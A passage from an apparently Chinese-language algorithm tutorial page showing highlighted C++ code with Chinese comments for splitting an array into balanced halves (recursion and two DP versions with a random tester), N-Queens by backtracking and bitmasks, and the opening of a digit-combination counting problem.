class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;climits&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">// 递归函数：选择子数组的元素，使得总和尽量接近rest但不超过rest</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">process</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr, <span class="hljs-type">int</span> i, <span class="hljs-type">int</span> picks, <span class="hljs-type">int</span> rest)</span> &#123;<br>    <span class="hljs-keyword">if</span> (i == arr.size()) &#123;  <span class="hljs-comment">// 如果所有元素都遍历完了</span><br>        <span class="hljs-comment">// 判断当前挑选的元素数量是否符合条件</span><br>        <span class="hljs-keyword">if</span> ((arr.size() &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> (picks == (arr.size() &gt;&gt; <span class="hljs-number">1</span>)) ? <span class="hljs-number">0</span> : <span class="hljs-number">-1</span>;  <span class="hljs-comment">// 如果是偶数个元素，挑选一半</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> (picks == (arr.size() &gt;&gt; <span class="hljs-number">1</span>) || picks == (arr.size() &gt;&gt; <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>) ? <span class="hljs-number">0</span> : <span class="hljs-number">-1</span>;  <span class="hljs-comment">// 如果是奇数个元素，可以挑选半个或半个+1</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 选择不使用当前元素</span><br>    <span class="hljs-type">int</span> p1 = process(arr, i + <span class="hljs-number">1</span>, picks, rest);<br>    <span class="hljs-comment">// 选择使用当前元素</span><br>    <span class="hljs-type">int</span> p2 = <span class="hljs-number">-1</span>;<br>    <span class="hljs-type">int</span> next2 = <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">if</span> (arr[i] &lt;= rest) &#123;  <span class="hljs-comment">// 如果当前元素不超过剩余的容量</span><br>        next2 = process(arr, i + <span class="hljs-number">1</span>, picks + <span class="hljs-number">1</span>, rest - arr[i]);  <span class="hljs-comment">// 继续递归，挑选下一个元素</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> (next2 != <span class="hljs-number">-1</span>) &#123;  <span class="hljs-comment">// 如果选择了当前元素</span><br>        p2 = arr[i] + next2;  <span class="hljs-comment">// 加上当前元素的值</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> max(p1, p2);  <span class="hljs-comment">// 返回两种选择中的最大值</span><br>&#125;<br><br><br><span class="hljs-comment">// 动态规划函数1</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">dp1</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr)</span> &#123;<br>    <span class="hljs-keyword">if</span> (arr.empty() || arr.size() &lt; <span class="hljs-number">2</span>) &#123;  <span class="hljs-comment">// 如果数组为空或者只有一个元素，返回0</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-comment">// 计算数组元素的总和，并计算目标的最大和（sum / 2）</span><br>    <span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : arr) &#123;<br>        sum += num;<br>    &#125;<br>    sum &gt;&gt;= <span class="hljs-number">1</span>;  <span class="hljs-comment">// 计算一半的总和</span><br><br>    <span class="hljs-type">int</span> N = arr.size();  <span class="hljs-comment">// 数组的大小</span><br>    <span class="hljs-type">int</span> M = (arr.size() + <span class="hljs-number">1</span>) &gt;&gt; <span class="hljs-number">1</span>;  <span class="hljs-comment">// 最大挑选的元素数量</span><br><br>    <span class="hljs-comment">// 使用三维DP数组，dp[i][j][k]表示从第i个元素开始，挑选了j个元素，总和为k的最大值</span><br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt;&gt; dp(N + <span class="hljs-number">1</span>, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt;(M + <span class="hljs-number">1</span>, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(sum + <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>)));<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt;= sum; k++) &#123;<br>        dp[N][M][k] = <span class="hljs-number">0</span>;  <span class="hljs-comment">// 终止条件：如果已经遍历完所有元素，且挑选了最大数量的元素，总和为k</span><br>    &#125;<br><br>    <span class="hljs-comment">// 如果数组大小是奇数，允许挑选数量为M-1的情况</span><br>    <span class="hljs-keyword">if</span> ((arr.size() &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt;= sum; k++) &#123;<br>            dp[N][M - <span class="hljs-number">1</span>][k] = <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 从后往前填充DP数组</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = N - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> picks = <span class="hljs-number">0</span>; picks &lt;= M; picks++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> rest = <span class="hljs-number">0</span>; rest &lt;= sum; rest++) &#123;<br>                <span class="hljs-type">int</span> p1 = dp[i + <span class="hljs-number">1</span>][picks][rest];  <span class="hljs-comment">// 不选择当前元素的情况</span><br>                <span class="hljs-type">int</span> p2 = <span class="hljs-number">-1</span>;<br>                <span class="hljs-type">int</span> next2 = <span class="hljs-number">-1</span>;<br>                <span class="hljs-comment">// 如果当前元素可以选择，并且剩余数量符合要求，选择当前元素</span><br>                <span class="hljs-keyword">if</span> (picks + <span class="hljs-number">1</span> &lt;= M &amp;&amp; arr[i] &lt;= rest) &#123;<br>                    next2 = dp[i + <span class="hljs-number">1</span>][picks + <span class="hljs-number">1</span>][rest - arr[i]];<br>                &#125;<br>                <span class="hljs-keyword">if</span> (next2 != <span class="hljs-number">-1</span>) &#123;<br>                    p2 = arr[i] + next2;  <span class="hljs-comment">// 加上当前元素的值</span><br>                &#125;<br>                dp[i][picks][rest] = max(p1, p2);  <span class="hljs-comment">// 选择最大值</span><br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dp[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>][sum];  <span class="hljs-comment">// 返回结果</span><br>&#125;<br><br><br><br><span class="hljs-comment">// 动态规划函数2</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">dp2</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr)</span> &#123;<br>    <span class="hljs-keyword">if</span> (arr.empty() || arr.size() &lt; <span class="hljs-number">2</span>) &#123;  <span class="hljs-comment">// 如果数组为空或者只有一个元素，返回0</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-comment">// 计算数组元素的总和，并计算目标的最大和（sum / 2）</span><br>    <span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : arr) &#123;<br>        sum += num;<br>    &#125;<br>    sum &gt;&gt;= <span class="hljs-number">1</span>;  <span class="hljs-comment">// 计算一半的总和</span><br>    <span class="hljs-type">int</span> N = arr.size();  <span class="hljs-comment">// 数组的大小</span><br>    <span class="hljs-type">int</span> M = (arr.size() + <span class="hljs-number">1</span>) &gt;&gt; <span class="hljs-number">1</span>;  <span class="hljs-comment">// 最大挑选的元素数量</span><br>    <span class="hljs-comment">// 使用三维DP数组，dp[i][j][k]表示从第i个元素开始，挑选了j个元素，总和为k的最大值</span><br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt;&gt; dp(N, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt;(M + <span class="hljs-number">1</span>, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(sum + <span class="hljs-number">1</span>, INT_MIN)));<br>    <span class="hljs-comment">// 初始化DP数组</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; N; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt;= sum; k++) &#123;<br>            dp[i][<span class="hljs-number">0</span>][k] = <span class="hljs-number">0</span>;  <span class="hljs-comment">// 如果没有挑选元素，和为0</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 初始化第一个元素的情况</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt;= sum; k++) &#123;<br>        dp[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>][k] = (arr[<span class="hljs-number">0</span>] &lt;= k ? arr[<span class="hljs-number">0</span>] : INT_MIN);<br>    &#125;<br>    <span class="hljs-comment">// 填充DP数组</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; N; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= min(i + <span class="hljs-number">1</span>, M); j++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt;= sum; k++) &#123;<br>                dp[i][j][k] = dp[i - <span class="hljs-number">1</span>][j][k];  <span class="hljs-comment">// 不选择当前元素的情况</span><br>                <span class="hljs-keyword">if</span> (k - arr[i] &gt;= <span class="hljs-number">0</span>) &#123;<br>                    dp[i][j][k] = max(dp[i][j][k], dp[i - <span class="hljs-number">1</span>][j - <span class="hljs-number">1</span>][k - arr[i]] + arr[i]);  <span class="hljs-comment">// 选择当前元素</span><br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> max(dp[N - <span class="hljs-number">1</span>][M][sum], dp[N - <span class="hljs-number">1</span>][N - M][sum]);  <span class="hljs-comment">// 返回最大值</span><br>&#125;<br><span class="hljs-comment">// 封装的递归方法，用来选择子数组的元素，使得总和尽量接近sum / 2</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">right</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr)</span> &#123;<br>    <span class="hljs-keyword">if</span> (arr.empty() || arr.size() &lt; <span class="hljs-number">2</span>) &#123;  <span class="hljs-comment">// 如果数组为空或者只有一个元素，返回0</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-comment">// 计算总和</span><br>    <span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : arr) &#123;<br>        sum += num;<br>    &#125;<br>    <span class="hljs-keyword">return</span> process(arr, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, sum &gt;&gt; <span class="hljs-number">1</span>);  <span class="hljs-comment">// 调用递归函数</span><br>&#125;<br><br><br><span class="hljs-comment">// 随机生成一个数组</span><br><span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">randomArray</span><span class="hljs-params">(<span class="hljs-type">int</span> len, <span class="hljs-type">int</span> value)</span> &#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">arr</span><span class="hljs-params">(len)</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>        arr[i] = rand() % value;<br>    &#125;<br>    <span class="hljs-keyword">return</span> arr;<br>&#125;<br><br><span class="hljs-comment">// 打印数组</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">printArray</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : arr) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; num &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">const</span> <span class="hljs-type">int</span> maxLen = <span class="hljs-number">10</span>;  <span class="hljs-comment">// 最大数组长度</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">int</span> maxValue = <span class="hljs-number">50</span>;  <span class="hljs-comment">// 数组中元素的最大值</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">int</span> testTime = <span class="hljs-number">10000</span>;  <span class="hljs-comment">// 测试次数</span><br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;测试开始&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; testTime; i++) &#123;<br>        <span class="hljs-type">int</span> len = rand() % maxLen;  <span class="hljs-comment">// 随机生成数组长度</span><br>        <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; arr = randomArray(len, maxValue);  <span class="hljs-comment">// 生成随机数组</span><br><br>        <span class="hljs-type">int</span> ans1 = right(arr);  <span class="hljs-comment">// 使用递归方法计算结果</span><br>        <span class="hljs-type">int</span> ans2 = dp1(arr);  <span class="hljs-comment">// 使用动态规划方法1计算结果</span><br>        <span class="hljs-type">int</span> ans3 = dp2(arr);  <span class="hljs-comment">// 使用动态规划方法2计算结果</span><br><br>        <span class="hljs-comment">// 如果三种方法返回的结果不一致，输出数组和结果</span><br>        <span class="hljs-keyword">if</span> (ans1 != ans2 || ans1 != ans3) &#123;<br>            printArray(arr);<br>            <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;right: &quot;</span> &lt;&lt; ans1 &lt;&lt; <span class="hljs-built_in">endl</span>;<br>            <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;dp1: &quot;</span> &lt;&lt; ans2 &lt;&lt; <span class="hljs-built_in">endl</span>;<br>            <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;dp2: &quot;</span> &lt;&lt; ans3 &lt;&lt; <span class="hljs-built_in">endl</span>;<br>            <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Oops!&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125; <br>    &#125;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;测试结束&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="N皇后"><a href="#N皇后" class="headerlink" title="N皇后"></a>N皇后</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cmath&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">// 方法 1：使用递归回溯求解 N 皇后问题</span><br><span class="hljs-comment">// 返回所有合法的放置方法数</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">num1</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> &#123;<br>    <span class="hljs-keyword">if</span> (n &lt; <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// 如果 n 小于 1，直接返回 0</span><br>    &#125;<br>    <span class="hljs-comment">// 创建记录皇后位置的数组，record[i] = j 表示第 i 行的皇后放置在第 j 列</span><br>    <span class="hljs-type">int</span> record[n];<br>    <span class="hljs-keyword">return</span> process1(<span class="hljs-number">0</span>, record, n);  <span class="hljs-comment">// 从第 0 行开始递归</span><br>&#125;<br><br><span class="hljs-comment">// 递归函数，处理第 i 行的皇后放置</span><br><span class="hljs-comment">// i 表示当前处理的行，record 数组记录每一行皇后的位置，n 为皇后的数量</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">process1</span><span class="hljs-params">(<span class="hljs-type">int</span> i, <span class="hljs-type">int</span> record[], <span class="hljs-type">int</span> n)</span> &#123;<br>    <span class="hljs-keyword">if</span> (i == n) &#123;  <span class="hljs-comment">// 如果已经放置完所有皇后，说明是一种合法解</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> res = <span class="hljs-number">0</span>;  <span class="hljs-comment">// 用于累加合法解的数量</span><br>    <span class="hljs-comment">// 遍历当前行 i 的所有列，尝试将皇后放置在不同的列 j</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++) &#123;<br>        <span class="hljs-keyword">if</span> (isValid(record, i, j)) &#123;  <span class="hljs-comment">// 如果放置在 (i, j) 位置合法</span><br>            record[i] = j;  <span class="hljs-comment">// 将皇后放置在 (i, j) 位置</span><br>            res += process1(i + <span class="hljs-number">1</span>, record, n);  <span class="hljs-comment">// 递归放置下一行的皇后</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-comment">// 检查当前放置在 (i, j) 位置的皇后是否与之前的皇后冲突</span><br><span class="hljs-comment">// record 数组记录每一行皇后的位置</span><br><span class="hljs-type">bool</span> <span class="hljs-title function_">isValid</span><span class="hljs-params">(<span class="hljs-type">int</span> record[], <span class="hljs-type">int</span> i, <span class="hljs-type">int</span> j)</span> &#123;<br>    <span class="hljs-comment">// 检查 0..i-1 行中的每一个皇后是否和 (i, j) 冲突</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; i; k++) &#123;<br>        <span class="hljs-keyword">if</span> (j == record[k] || <span class="hljs-built_in">abs</span>(record[k] - j) == <span class="hljs-built_in">abs</span>(i - k)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">// 如果同列或者同对角线，返回 false</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;  <span class="hljs-comment">// 如果没有冲突，返回 true</span><br>&#125;<br><br><span class="hljs-comment">// 方法 2：使用位运算优化 N 皇后问题</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">num2</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> &#123;<br>    <span class="hljs-keyword">if</span> (n &lt; <span class="hljs-number">1</span> || n &gt; <span class="hljs-number">32</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// 如果 n 小于 1 或者大于 32，返回 0</span><br>    &#125;<br>    <span class="hljs-comment">// limit: 32 位的全 1，用于表示每列是否可用，最多支持 32 皇后问题</span><br>    <span class="hljs-type">int</span> limit = (n == <span class="hljs-number">32</span>) ? <span class="hljs-number">-1</span> : (<span class="hljs-number">1</span> &lt;&lt; n) - <span class="hljs-number">1</span>;  <span class="hljs-comment">// 计算列可用的位掩码</span><br>    <span class="hljs-keyword">return</span> process2(limit, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);  <span class="hljs-comment">// 调用位运算的递归方法</span><br>&#125;<br><br><span class="hljs-comment">// 位运算递归方法</span><br><span class="hljs-comment">// limit: 限制列的掩码，colLim: 已经被占用的列，leftDiaLim: 已经被占用的左下对角线，rightDiaLim: 已经被占用的右下对角线</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">process2</span><span class="hljs-params">(<span class="hljs-type">int</span> limit, <span class="hljs-type">int</span> colLim, <span class="hljs-type">int</span> leftDiaLim, <span class="hljs-type">int</span> rightDiaLim)</span> &#123;<br>    <span class="hljs-keyword">if</span> (colLim == limit) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;  <span class="hljs-comment">// 如果所有列都被占用，说明已经放置完所有皇后</span><br>    &#125;<br>    <span class="hljs-comment">// pos: 当前可以放置皇后的所有位置，取 limit - colLim - leftDiaLim - rightDiaLim</span><br>    <span class="hljs-type">int</span> pos = limit &amp; (~(colLim | leftDiaLim | rightDiaLim));  <span class="hljs-comment">// 可以放置皇后的列</span><br>    <span class="hljs-type">int</span> mostRightOne = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> res = <span class="hljs-number">0</span>;  <span class="hljs-comment">// 用于累加合法解的数量</span><br>    <span class="hljs-keyword">while</span> (pos != <span class="hljs-number">0</span>) &#123;  <span class="hljs-comment">// 处理当前可以放置皇后的列</span><br>        <span class="hljs-comment">// 取 pos 中最右边的 1 作为要放置皇后的位置</span><br>        mostRightOne = pos &amp; (~pos + <span class="hljs-number">1</span>);<br>        pos = pos - mostRightOne;  <span class="hljs-comment">// 将 pos 中该位置清零，准备处理下一个位置</span><br>        <span class="hljs-comment">// 递归放置皇后</span><br>        res += process2(limit, colLim | mostRightOne, (leftDiaLim | mostRightOne) &lt;&lt; <span class="hljs-number">1</span>, (rightDiaLim | mostRightOne) &gt;&gt; <span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;  <span class="hljs-comment">// 返回合法解的数量</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> n = <span class="hljs-number">15</span>;  <span class="hljs-comment">// 设置皇后的数量</span><br><br>    <span class="hljs-comment">// 测试方法 2</span><br>    <span class="hljs-type">long</span> start = clock();<br>    <span class="hljs-built_in">cout</span> &lt;&lt; num2(n) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-type">long</span> end = clock();<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Method 2 cost time: &quot;</span> &lt;&lt; (end - start) * <span class="hljs-number">1000.0</span> / CLOCKS_PER_SEC &lt;&lt; <span class="hljs-string">&quot;ms&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><br>    <span class="hljs-comment">// 测试方法 1</span><br>    start = clock();<br>    <span class="hljs-built_in">cout</span> &lt;&lt; num1(n) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    end = clock();<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Method 1 cost time: &quot;</span> &lt;&lt; (end - start) * <span class="hljs-number">1000.0</span> / CLOCKS_PER_SEC &lt;&lt; <span class="hljs-string">&quot;ms&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="最大为N的数字组合"><a href="#最大为N的数字组合" class="headerlink" title="最大为N的数字组合"></a>最大为N的数字组合</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 最大为N的数字组合</span><br><span class="hljs-comment">// 给定一个按 非递减顺序 排列的数字数组 digits</span><br><span class="hljs-comment">// 已知digits一定不包含&#x27;0&#x27;，可能包含&#x27;1&#x27; ~ &#x27;9&#x27;，且无重复字符</span><br><span class="hljs-comment">// 你可以用任意次数 digits[i] 来写的数字</span><br><span class="hljs-comment">// 例如，如果 digits = [&#x27;1&#x27;,&#x27;3&#x27;,&#x27;5&#x27;]</span><br><span class="hljs-comment">// 我们可以写数字，如 &#x27;13&#x27;, &#x27;551&#x27;, 和 &#x27;1351315&#x27;</span><br><span class="hljs-comment">// 返回 可以生成的小于或等于给定整数 n 的正整数的个数</span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span 